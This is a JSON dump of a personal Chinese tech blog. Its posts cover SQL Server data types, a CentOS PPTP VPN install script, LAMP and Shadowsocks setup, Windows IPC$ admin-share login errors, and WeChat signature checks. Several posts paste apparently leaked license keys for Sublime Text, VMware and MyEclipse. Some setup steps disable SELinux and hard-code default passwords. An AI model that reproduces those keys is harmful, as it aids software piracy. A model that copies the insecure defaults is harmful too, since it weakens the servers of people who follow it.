“(qian后共有96个空格，就是把它填满为100个字节)。由于char是以固定长度的，所以它的速度会比varchar快得多!但程序处理起来要麻烦一点，要用trim之类的函数把两边的空格去掉! ntext 可变长度 Unicode 数据的最大长度为 230 - 1 (1,073,741,823) 个字符。存储大小是所输入字符个数的两倍（以字节为单位）。ntext 在 SQL-92 中的同义词是 national text。 text 服务器代码页中的可变长度非 Unicode 数据的最大长度为 231-1 (2,147,483,647) 个字符。当服务器代码页使用双字节字符时，存储量仍是 2,147,483,647 字节。存储大小可能小于 2,147,483,647 字节（取决于字符串）。 bigint：从-2^63(-9223372036854775808)到2^63-1(9223372036854775807)的整型数据，存储大小为 8 个字节。 int：从-2^31(-2,147,483,648)到2^31-1(2,147,483,647)的整型数据，存储大小为 4 个字节。 smallint：从-2^15(-32,768)到2^15-1(32,767)的整数数据，存储大小为 2 个字节。 tinyint：从0到255的整数数据，存储大小为 1 字节。 bit：1或0的整数数据，存储大小为 1 字节。 Unicode 数据 在 Microsoft SQL Server 2000 中，传统上非 Unicode 数据类型允许使用由特定字符集定义的字符。字符集是在安装 SQL Server 时选择的，不能更改。使用 Unicode 数据类型，列可存储由 Unicode 标准定义的任何字符，包含由不同字符集定义的所有字符。Unicode 数据类型需要相当于非 Unicode 数据类型两倍的存储空间。 Unicode 数据使用 SQL Server 中的 nchar、varchar 和 ntext 数据类型进行存储。对于存储来源于多种字符集的字符的列，可采用这些数据类型。当列中各项所包含的 Unicode 字符数不同时（至多为 4000），使用 nvarchar 类型。当列中各项为同一固定长度时（至多为 4000 个 Unicode 字符），使用 nchar 类型。当列中任意项超过 4000 个 Unicode字符时，使用 ntext 类型。 说明：SQL Server 的 Unicode 数据类型是基于 SQL-92 标准中的国家字符数据类型。SQL-92 使用前缀字符 n 标识这些数据类型及其值。 数据类型： 数据类弄是数据的一种属性，表示数据所表示信息的类型。任何一种计算机语言都定义了自己的数据类型。当然，不同的程序语言都具有不同的特点，所定义的数据类型的各类和名称都或多或少有些不同。SQL Server 提供了 25 种数据类型： ·Binary [(N)] ·Varbinary [(N)] ·Char [(N)] ·Varchar[(N)] ·Nchar[(N)] ·Nvarchar[(N)] ·Datetime ·Smalldatetime ·Decimal[(p[,s])] ·Numeric[(p[,s])] ·Float[(N)] ·Real ·Int ·Smallint ·Tinyint ·Money ·Smallmoney ·Bit ·Cursor ·Sysname ·Timestamp ·Uniqueidentifier ·Text ·Image ·Ntext (1)二进制数据类型 二进制数据包括 Binary、Varbinary 和 Image. Binary 数据类型既可以是固定长度的(Binary),也可以是变长度的。 Binary[(N)] 是 n 位固定的二进制数据。其中，n 的取值范围是从 1 到 8000。其存储窨的大小是 n + 4 个字节。 Varbinary[(N)] 是 n 位变长度的二进制数据。其中，n 的取值范围是从 1 到 8000。其存储窨的大小是 n + 4个字节，不是 n 个字节。 在 Image 数据类型中存储的数据是以位字符串存储的，不是由 SQL Server 解释的，必须由应用程序来解释。例如，应用程序可以使用 BMP、TIEF、GIF 和 JPEG 格式把数据存储在 Image 数据类型中。 (2)字符数据类型 字符数据的类型包括 Char，Varchar 和 Text。 字符数据是由任何字母、符号和数字任意组合而成的数据。 Varchar 是变长字符数据，其长度不超过 8KB。Char 是定长字符数据，其长度最多为 8KB。超过 8KB 的ASCII 数据可以使用Text 数据类型存储。例如:因为 Html 文档全部都是 ASCII 字符，并且在一般情况下长度超过 8KB，所以这些文档可以 Text 数据类型存储在 SQL Server 中。 (3)Unicode 数据类型 Unicode 数据类型包括 Nchar,Nvarchar 和Ntext。 在 Microsoft SQL Server 中，传统的非 Unicode 数据类型允许使用由特定字符集定义的字符。在 SQL Server 安装过程中，允许选择一种字符集。使用 Unicode 数据类型，列中可以存储任何由Unicode 标准定义的字符。在 Unicode 标准中，包括了以各种字符集定义的全部字符。使用Unicode 数据类型，所占的空间是使用非 Unicode 数据类型所占用的空间大小的两倍。 在 SQL Server 中，Unicode 数据以 Nchar、Nvarchar 和 Ntext 数据类型存储。使用这种字符类型存储的列可以存储多个字符集中的字符。当列的长度变化时，应该使用 Nvarchar 字符类型，这时最多可以存储 4000 个字符。当列的长度固定不变时，应该使用 Nchar 字符类型，同样，这时最多可以存储 4000 个字符。当使用 Ntext 数据类型时，该列可以存储多于 4000 个字符。 (4)日期和时间数据类型 日期和时间数据类型包括 Datetime 和 Smalldatetime 两种类型。 日期和时间数据类型由有效的日期和时间组成。例如，有效的日期和时间数据包括“4/01/98 12:15:00:00:00 PM”和“1:28:29:15:01 AM 8/17/98”。前一个数据类型是日期在前，时间在后一个数据类型是霎时间在前，日期在后。在 Microsoft SQL Server 中，日期和时间数据类型包括Datetime 和 Smalldatetime 两种类型时，所存储的日期范围是从 1753 年 1 月 1 日开始，到 9999 年12 月 31 日结束(每一个值要求 8 个存储字节)。使用 Smalldatetime 数据类型时，所存储的日期范围是 1900 年 1 月 1日 开始，到 2079 年 12 月 31 日结束(每一个值要求 4 个存储字节)。 日期的格式可以设定。设置日期格式的命令如下： Set DateFormat {format | @format _var| 其中，format | @format_var 是日期的顺序。有效的参数包括 MDY、DMY、YMD、YDM、MYD 和 DYM。在默认情况下，日期格式为 MDY。 例如，当执行 Set DateFormat YMD 之后，日期的格式为年 月 日 形式；当执行 Set DateFormat DMY 之后，日期的格式为 日 月有年 形式 （5）数字数据类型 数字数据只包含数字。数字数据类型包括正数和负数、小数（浮点数）和整数 。 整数由正整数和负整数组成，例如 39、25、0-2 和 33967。在 Micrsoft SQL Server 中，整数存储的数据类型是 Int，Smallint 和 Tinyint。Int 数据类型存储数据的范围大于 Smallint 数据类型存储数据的范围，而 Smallint 据类型存储数据的范围大于 Tinyint 数据类型存储数据的范围。使用 Int 数据狗昔存储数据的范围是从 -2 147 483 648 到 2 147 483 647（每一个值要求 4个字节存储空间）。使用 Smallint 数据类型时，存储数据的范围从 -32 768 到 32 767（每一个值要求2个字节存储空间）。使用 Tinyint 数据类型时，存储数据的范围是从0 到255（每一个值要求1个字节存储空间）。 精确小娄数据在 SQL Server 中的数据类型是 Decimal 和 Numeric。这种数据所占的存储空间根据该数据的位数后的位数来确定。 在SQL Server 中，近似小数数据的数据类型是 Float 和 Real。例如，三分之一这个分数记作。3333333，当使用近似数据类型时能准确表示。因此，从系统中检索到的数据可能与存储在该列中数据不完全一样。 （6）货币数据表示正的或者负的货币数量 。在 Microsoft SQL Server 中，货币数据的数据类型是Money 和 Smallmoney。Money 数据类型要求 8 个存储字节，Smallmoney 数据类型要求 4 个存储字节。 （7）特殊数据类型 特殊数据类型包括前面没有提过的数据类型。特殊的数据类型有3种，即 Timestamp、Bit 和 Uniqueidentifier。 Timestamp 用于表示SQL Server 活动的先后顺序，以二进投影的格式表示。Timestamp 数据与插入数据或者日期和时间没有关系。 Bit 由 1 或者 0 组成。当表示真或者假、ON 或者 OFF 时，使用 Bit 数据类型。例如，询问是否是每一次访问的客户机请求可以存储在这种数据类型的列中。 Uniqueidentifier 由 16 字节的十六进制数字组成，表示一个全局唯一的。当表的记录行要求唯一时，GUID是非常有用。例如，在客户标识号列使用这种数据类型可以区别不同的客户。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"CentOS 6、7下PPTP VPN.sh","slug":"centos-6-7-pptp-vpn-sh","date":"2015-11-19T21:44:16.000Z","updated":"2016-12-23T08:30:12.772Z","comments":true,"path":"2015/11/20/centos-6-7-pptp-vpn-sh/","link":"","permalink":"http://blog.dragon-yuan.me/2015/11/20/centos-6-7-pptp-vpn-sh/","excerpt":"","text":"#!/bin/bash # # Author: yeho # Blog: http://blog.linuxeye.com # # Installs a PPTP VPN-only system for CentOS # Check if user is root [ $(id -u) != \"0\" ] && echo \"Error: You must be root to run this script\" && exit 1 export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin clear printf \" ####################################################################### # [LNMP](https://blog.linuxeye.com/31.html \"LNMP\")/[LAMP](https://blog.linuxeye.com/82.html \"LAMP\")/LANMP for CentOS/RadHat 5+ Debian 6+ and Ubuntu 12+ # # For more information please visit http://blog.linuxeye.com/31.html # ####################################################################### \" [ ! -e '/usr/bin/curl' ] && yum -y install curl VPN_IP=`curl ipv4.icanhazip.com` VPN_USER=\"linuxeye\" VPN_PASS=\"linuxeye\" VPN_LOCAL=\"192.168.0.150\" VPN_REMOTE=\"192.168.0.151-200\" while : do echo read -p \"Please input username: \" VPN_USER [ -n \"$VPN_USER\" ] && break done while : do echo read -p \"Please input password: \" VPN_PASS [ -n \"$VPN_PASS\" ] && break done clear if [ -n \"`grep 'CentOS [Linux](http://www.linuxeye.com/ \"Linux\") release 7' /etc/redhat-release`\" ];then #CentOS_REL=7 if [ ! -e /etc/yum.repos.d/epel.repo ];then cat > /etc/yum.repos.d/epel.repo /etc/sysctl.conf elif [ -n \"`grep 'CentOS release 6' /etc/redhat-release`\" ];then #CentOS_REL=6 for Package in wget make openssl gcc-c++ iptables ppp do yum -y install $Package done sed -i 's@net.ipv4.ip_forward.*@net.ipv4.ip_forward = 1@g' /etc/sysctl.conf rpm -Uvh http://poptop.sourceforge.net/yum/stable/rhel6/pptp-release-current.noarch.rpm yum -y install pptpd else echo -e \"\\033[31mDoes not support this OS, Please contact the author! \\033[0m\" exit 1 fi echo \"1\" > /proc/sys/net/ipv4/ip_forward sysctl -p /etc/sysctl.conf [ -z \"`grep '^localip' /etc/pptpd.conf`\" ] && echo \"localip $VPN_LOCAL\" >> /etc/pptpd.conf # Local IP address of your VPN server [ -z \"`grep '^remoteip' /etc/pptpd.conf`\" ] && echo \"remoteip $VPN_REMOTE\" >> /etc/pptpd.conf # Scope for your home network if [ -z \"`grep '^ms-dns' /etc/ppp/options.pptpd`\" ];then echo \"ms-dns 8.8.8.8\" >> /etc/ppp/options.pptpd # Google DNS Primary echo \"ms-dns 209.244.0.3\" >> /etc/ppp/options.pptpd # Level3 Primary echo \"ms-dns 208.67.222.222\" >> /etc/ppp/options.pptpd # OpenDNS Primary fi echo \"$VPN_USER pptpd $VPN_PASS *\" >> /etc/ppp/chap-secrets ETH=`route | grep default | awk '{print $NF}'` [ -z \"`grep '1723 -j ACCEPT' /etc/sysconfig/iptables`\" ] && iptables -I INPUT 4 -p tcp -m state --state NEW -m tcp --dport 1723 -j ACCEPT [ -z \"`grep 'gre -j ACCEPT' /etc/sysconfig/iptables`\" ] && iptables -I INPUT 5 -p gre -j ACCEPT iptables -t nat -A POSTROUTING -o $ETH -j MASQUERADE service iptables save sed -i 's@^-A INPUT -j REJECT --reject-with icmp-host-prohibited@#-A INPUT -j REJECT --reject-with icmp-host-prohibited@' /etc/sysconfig/iptables sed -i 's@^-A FORWARD -j REJECT --reject-with icmp-host-prohibited@#-A FORWARD -j REJECT --reject-with icmp-host-prohibited@' /etc/sysconfig/iptables service iptables restart service pptpd restart chkconfig pptpd on clear echo -e \"You can now connect to your VPN via your external IP \\033[32m${VPN_IP}\\033[0m\" echo -e \"Username: \\033[32m${VPN_USER}\\033[0m\" echo -e \"Password: \\033[32m${VPN_PASS}\\033[0m\"","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Putty","slug":"putty","date":"2015-10-23T16:10:57.000Z","updated":"2016-12-23T08:36:00.815Z","comments":true,"path":"2015/10/24/putty/","link":"","permalink":"http://blog.dragon-yuan.me/2015/10/24/putty/","excerpt":"","text":"Putty DOWNLOAD","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"CentOS-7-64bit 配置Apache + MySQL + PHP ","slug":"centos-7-64bit-apache-mysql-php","date":"2015-10-17T00:40:51.000Z","updated":"2017-12-01T14:20:19.430Z","comments":true,"path":"2015/10/17/centos-7-64bit-apache-mysql-php/","link":"","permalink":"http://blog.dragon-yuan.me/2015/10/17/centos-7-64bit-apache-mysql-php/","excerpt":"","text":"一、配置防火墙，开启80端口、3306端口 CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。 1、关闭firewall： #停止firewall服务 1. systemctl stop firewalld.service #禁止firewall开机启动 1. systemctl disable firewalld.service 2、安装iptables防火墙 #安装 1. yum install iptables-services #编辑防火墙配置文件 1. vi /etc/sysconfig/iptables # Firewall configuration written by system-config-firewall # Manual customization of this file is not recommended. *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] -A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT -A INPUT -m state –state NEW -m tcp -p tcp –dport 80 -j ACCEPT -A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT -A INPUT -j REJECT –reject-with icmp-host-prohibited -A FORWARD -j REJECT –reject-with icmp-host-prohibited COMMIT :wq! #保存退出 1234567891011121314151617181920212223*filter:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]:RH-Firewall-1-INPUT - [0:0]-A INPUT -j RH-Firewall-1-INPUT-A FORWARD -j RH-Firewall-1-INPUT-A RH-Firewall-1-INPUT -i lo -j ACCEPT-A RH-Firewall-1-INPUT -p icmp --icmp-type any -j ACCEPT-A RH-Firewall-1-INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -p tcp --dport 21 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 4433 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 5293 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 7777 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 8666 -j ACCEPT-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 9000 -j ACCEPT-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibitedCOMMIT #最后重启防火墙使配置生效 1. systemctl restart iptables.service #设置防火墙开机启动 1. systemctl enable iptables.service1. systemctl disable iptables.service 二、关闭SELINUX#修改配置文件 1. vi /etc/selinux/config #SELINUX=enforcing #注释掉 #SELINUXTYPE=targeted #注释掉 SELINUX=disabled #增加 :wq! #保存退出 #使配置立即生效 1. setenforce 0 三.安装apache 1. yum install httpd 可能会用到的： systemctl start httpd.service #启动apache systemctl stop httpd.service #停止apache systemctl restart httpd.service #重启apache systemctl enable httpd.service #设置apache开机启动 CentOS 7的yum源中貌似没有正常安装mysql时的mysql-sever文件，需要去官网上下载 # wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm# rpm -ivh mysql-community-release-el7-5.noarch.rpm# yum install mysql-community-server 成功安装之后重启mysql服务 # service mysqld restart 初次安装mysql是root账户是没有密码的 设置密码的方法 # mysql -urootmysql&gt; set password for ‘root’@‘localhost’ = password(‘mypasswd’);mysql&gt; exit 五.安装php 1. yum install php 安装PHP组件，使PHP支持mysql 1. yum install php-mysql php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash 重启对应服务 1. systemctl restart mysqld.service2. systemctl restart httpd.service","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Centos 7安装配置Shadowsocks","slug":"centos-7-shadowsocks","date":"2015-10-16T23:52:38.000Z","updated":"2016-12-23T08:30:25.838Z","comments":true,"path":"2015/10/17/centos-7-shadowsocks/","link":"","permalink":"http://blog.dragon-yuan.me/2015/10/17/centos-7-shadowsocks/","excerpt":"","text":"源网页1. 安装shadowsocksyum install python-setuptools && easy_install pip pip install shadowsocks 2. 新建shadowsocks的配置文件mkdir -p /etc/shadowsocks vi /etc/shadowsocks/config.json 输入以下内容： { \"server\":\"0.0.0.0\", \"server_port\":8888, \"local_address\": \"127.0.0.1\", \"local_port\":1080, \"password\":\"mypassword\", \"timeout\":300, \"method\":\"aes-256-cfb\", \"fast_open\": false, \"workers\": 1 } 说明：服务器IP，服务端口（建议自定义），本地监听IP，本地监听端口，密码（建议自定义），超时时间，加密算法，关闭fast-open，工作进程数量为1。 3. 新建shadowsocks的.service文件vi /etc/systemd/system/shadowsocks-server.service 输入以下内容： [Unit] Description=Shadowsocks Server After=network.target [Service] Type=forking PIDFile=/run/shadowsocks/server.pid PermissionsStartOnly=true ExecStartPre=/bin/mkdir -p /run/shadowsocks ExecStartPre=/bin/chown root:root /run/shadowsocks ExecStart=/usr/bin/ssserver --pid-file /var/run/shadowsocks/server.pid -c /etc/shadowsocks/config.json -d start Restart=on-abort User=root Group=root UMask=0027 [Install] WantedBy=multi-user.target 4. 运行shadowsocks服务并设置为开机自启：systemctl start shadowsocks-server.service systemctl enable shadowsocks-server.service 5. 防火墙开放shadowsocks服务端口：firewall-cmd --permanent --add-port=8888/tcp firewall-cmd --reload 6. 常用操作升级shadowsocks pip install -U shadowsocks 卸载shadowsocks pip uninstall shadowsocks 查询已安装的shadowsocks pip search \"shadowsocks\" 停止shadowsocks服务 systemctl stop shadowsocks-server.service","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"MyEclipse10.0 KEY","slug":"myeclipse10-0-key","date":"2015-10-13T02:41:36.000Z","updated":"2016-12-23T08:34:42.637Z","comments":true,"path":"2015/10/13/myeclipse10-0-key/","link":"","permalink":"http://blog.dragon-yuan.me/2015/10/13/myeclipse10-0-key/","excerpt":"","text":"Subscriber: dragon Code: qLR8ZC-855575-63656756147000009 THANKS：http://key.858game.com/","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Shadowsocks","slug":"shadowsocks","date":"2015-10-10T00:11:54.000Z","updated":"2016-12-23T08:36:34.747Z","comments":true,"path":"2015/10/10/shadowsocks/","link":"","permalink":"http://blog.dragon-yuan.me/2015/10/10/shadowsocks/","excerpt":"","text":"Shadowsocks DOWNLOAD","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Ubuntu--apache2+php5+mysql","slug":"ubuntu-apache2-php5-mysql","date":"2015-09-25T06:41:57.000Z","updated":"2016-12-23T08:37:58.716Z","comments":true,"path":"2015/09/25/ubuntu-apache2-php5-mysql/","link":"","permalink":"http://blog.dragon-yuan.me/2015/09/25/ubuntu-apache2-php5-mysql/","excerpt":"","text":"sudo apt-get install build-essential autoconf automake1.9 cvs subversion sudo apt-get install apache2 sudo apt-get install php5 sudo apt-get install mysql-server libapache2-mod-auth-mysql php5-mysql Mysql的启动/停止/重启sudo /etc/init.d/mysql startsudo /etc/init.d/mysql stopsudo /etc/init.d/mysql restart /* Mysql 安装完后设置root密码mysql -uroot (一开始root用户的密码为空所以可以进去， 如果在安装的时候您在界面中设置了password可跳过此步)进入mysql控制台：set password for ‘root’@’localhost’=PASSWORD(‘yourpassword’);如果成功， mysql提示 ： Query OK 0rows affected（0.00sec） */ 安装完成配置// sudo gedit /etc/apach2/apach2.conf配置apache服务器// sudo gedit /etc/php5/apach2/php.ini 配置php在文本框中找到”; extension=mysql.so”， 去掉；表示apache启动时加载与mysql连接的模块， 然后保存， 重启apache服务器。sudo /etc/init.d/apache2 restart","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"mstsc端口修改","slug":"mstsc","date":"2015-09-23T07:01:49.000Z","updated":"2016-12-23T08:34:17.230Z","comments":true,"path":"2015/09/23/mstsc/","link":"","permalink":"http://blog.dragon-yuan.me/2015/09/23/mstsc/","excerpt":"","text":"1.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp 2.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-TCP 右侧PortNumber","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"net use错误原因解决","slug":"net-use","date":"2015-09-22T01:31:03.000Z","updated":"2016-12-23T08:35:18.531Z","comments":true,"path":"2015/09/22/net-use/","link":"","permalink":"http://blog.dragon-yuan.me/2015/09/22/net-use/","excerpt":"","text":"(1)”发生系统错误 1326。 登录失败： 未知的用户名或错误密码。” 在远程机的”控制面板-文件夹选项-查看-简单的文件共享”,去掉选取,然后再尝试连接。简单文件共享会把网络连接权限都归为 guest连接，是无法访问C$等管理共享的. (2)”发生系统错误 1327。 登陆失败：用户帐户限制。可能的原因包括不允许空密码，登陆时间限制，或强制的策略限。”在远程机的”控制面板－管理工具－本地安全策略－安全选项－用户权限”指派里，禁用”空密码用户只能进行控制台登陆”. (3)”//IP/c$”时提示找不到网络途径。在”网络和拨号连接”中”本地连接”中选取”Internet协议(TCP/IP)”属性，进入”高级TCP/IP设置”选”WINS设置”里面有一项”启用TCP/IP的NETBIOS ///////////////////////////////////////////////////////////////////////////// 问：net use 找不到网络路径 net use z:&gt;\\192.168.0.2\\C$ “18553262” /user:adminis Net use 会记录新的网络连接。 1，只有nt/2000/xp及以上系统才可以建立ipc$。如果你用的是98/me是没有该功能的。 2，确认你的命令没有打错。正确的命令是： net use \\目标IP\\ipc$ “密码” /user:”用户名” 注意别多了或少了空格。当用户名和密码中不包含空格时两边的双引号可以省略。空密码用””表示。 3，根据返回的错误号分析原因：错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；错误号51，Windows 无法找到网络路径 : 网络有问题；错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动；目标删除了ipc$；错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连。错误号1326，未知的用户名或错误密码 ： 原因很明显了；错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况）错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Bootstrap下拉菜单","slug":"bootstrap","date":"2015-09-21T23:31:29.000Z","updated":"2016-12-23T08:29:27.182Z","comments":true,"path":"2015/09/22/bootstrap/","link":"","permalink":"http://blog.dragon-yuan.me/2015/09/22/bootstrap/","excerpt":"","text":"## # &lt;a href=”#feature-tab” data-tab=“ “&gt;# # #","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"vmware workstation 9 序列号","slug":"vmware-workstation-9","date":"2015-09-21T05:00:43.000Z","updated":"2016-12-23T08:38:33.941Z","comments":true,"path":"2015/09/21/vmware-workstation-9/","link":"","permalink":"http://blog.dragon-yuan.me/2015/09/21/vmware-workstation-9/","excerpt":"","text":"NY0K2-2ULDJ-LZUP1-MV154-8363F 4F4R4-AEK53-TZYU9-KK9X4-9AWPQ","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Java PATH","slug":"java-path","date":"2015-07-29T21:37:11.000Z","updated":"2016-12-23T08:32:35.251Z","comments":true,"path":"2015/07/30/java-path/","link":"","permalink":"http://blog.dragon-yuan.me/2015/07/30/java-path/","excerpt":"","text":"新建 JAVA_HOME ： C 新建Classpath： .;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar 在Path前面添加 ： %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"XML 与 HTML 关联","slug":"xml-html","date":"2015-07-23T18:15:20.000Z","updated":"2016-12-23T08:39:03.443Z","comments":true,"path":"2015/07/24/xml-html/","link":"","permalink":"http://blog.dragon-yuan.me/2015/07/24/xml-html/","excerpt":"","text":"XML ：可扩展标记语言是W3C的推荐标准 XML 于 1998 年 2 月 10 日成为 W3C 的推荐标准。 XML 是各种应用程序之间进行数据传输的最常用的工具 HTML ：超文本标记语言 (Hyper Text Markup Language)，是很古老的XML语言，最初由互联网工程小组（IETF）制定的语法标准，由于该组织的权威性，目前所有的浏览器都使用该语法标准来解析并显示网页。","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"sublime Text 自动排列代码设置","slug":"sublime-text","date":"2015-07-14T16:26:09.000Z","updated":"2016-12-23T08:37:31.523Z","comments":true,"path":"2015/07/15/sublime-text/","link":"","permalink":"http://blog.dragon-yuan.me/2015/07/15/sublime-text/","excerpt":"","text":"1、打开Sublime 2、Ctrl + Shift + p 3、输入key选中User后在内容中加入下面代码 [ {“keys”:[“shift+ctrl+f”],”command”:”reindent”,”args”:{“single_line”:false}}, ]","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"Sublime Text 3086 KEY","slug":"sublime-text-3086-key","date":"2015-07-13T18:19:38.000Z","updated":"2016-12-23T08:37:24.221Z","comments":true,"path":"2015/07/14/sublime-text-3086-key/","link":"","permalink":"http://blog.dragon-yuan.me/2015/07/14/sublime-text-3086-key/","excerpt":"","text":"—– BEGIN LICENSE —– Andrew Weber Single User License EA7E-855605 813A03DD 5E4AD9E6 6C0EEB94 BC99798F 942194A6 02396E98 E62C9979 4BB979FE 91424C9D A45400BF F6747D88 2FB88078 90F5CC94 1CDC92DC 8457107A F151657B 1D22E383 A997F016 42397640 33F41CFC E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D 5CDB7036 E56DE1C0 EFCC0840 650CD3A6 B98FC99C 8FAC73EE D2B95564 DF450523 —— END LICENSE —— —– BEGIN LICENSE —– K-20 Single User License EA7E-940129 3A099EC1 C0B5C7C5 33EBF0CF BE82FE3B EAC2164A 4F8EC954 4E87F1E5 7E4E85D6 C5605DE6 DAB003B4 D60CA4D0 77CB1533 3C47F579 FB3E8476 EB3AA9A7 68C43CD9 8C60B563 80FE367D 8CAD14B3 54FB7A9F 4123FFC4 D63312BA 141AF702 F6BBA254 B094B9C0 FAA4B04C 06CC9AFC FD412671 82E3AEE0 0F0FAAA7 8FA773C9 383A9E18 —— END LICENSE —— —– BEGIN LICENSE —– J2TeaM 2 User License EA7E-940282 45CB0D8F 09100037 7D1056EB A1DDC1A2 39C102C5 DF8D0BF0 FC3B1A94 4F2892B4 0AEE61BA 65758D3B 2EED551F A3E3478C C1C0E04E CA4E4541 1FC1A2C1 3F5FB6DB CFDA1551 51B05B5D 2D3C8CFE FA8B4285 051750E3 22D1422A 7AE3A8A1 3B4188AC 346372DA 37AA8ABA 6EB30E41 781BC81F B5CA66E3 A09DBD3A 3FE85BBD 69893DBD —— END LICENSE ——","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"微信二次开发第一弹（开发者中心TOKEN配置与服务器连接）","slug":"token","date":"2015-04-22T06:19:27.000Z","updated":"2016-12-23T08:37:41.974Z","comments":true,"path":"2015/04/22/token/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/22/token/","excerpt":"","text":"本文目标：学习一种比较安全的服务器间互相验证身份的方式。 问题：开发微信公众平台接口，开发者的服务器为了确保请求是否来自微信服务器，应该如何去做？ 1) 在微信管理页面上填写URL和TOKEN，开发者服务器上也记录同样的TOKEN。 2) 微信服务器发送HTTP请求，附带上参数(注意TOKEN是不会被传输的) 参数 描述 signature微信加密签名timestamp时间戳nonce随机数echostr随机字符串 其中signature值通过如下摘要运算得出： 1\\. 将token、timestamp、nonce三个参数进行字典序排序 2\\. 将三个参数字符串拼接成一个字符串进行sha1加密(这个加密是不可逆的)，并将结果的byte[]转换为16进制字符串 3) 开发者服务器接收到signature,timestamp,nonce,echostr参数，跟服务器做同样的摘要运算，得到预期的一个signatrue，然后对比微信服务器发送过来的signature参数，如果相同，证明双方的TOKEN是一致的，开发者服务器确实接收到了来自微信服务器的请求，开发者服务器最后返回echostr，以告诉微信服务器接入成功。具体的开发者服务器校验逻辑代码如下显示。 `valid(); class wechatCallbackapiTest { public function valid() { $echoStr = $_GET[\"echostr\"]; //valid signature , option if($this->checkSignature()){ echo $echoStr; exit; } } public function responseMsg() { //get post data, May be due to the different environments $postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"]; //extract post data if (!empty($postStr)){ $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA); $fromUsername = $postObj->FromUserName; $toUsername = $postObj->ToUserName; $keyword = trim($postObj->Content); $time = time(); $textTpl = \" %s 0 \"; if(!empty( $keyword )) { $msgType = \"text\"; $contentStr = \"Welcome to wechat world!\"; $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr); echo $resultStr; }else{ echo \"Input something...\"; } }else { echo \"\"; exit; 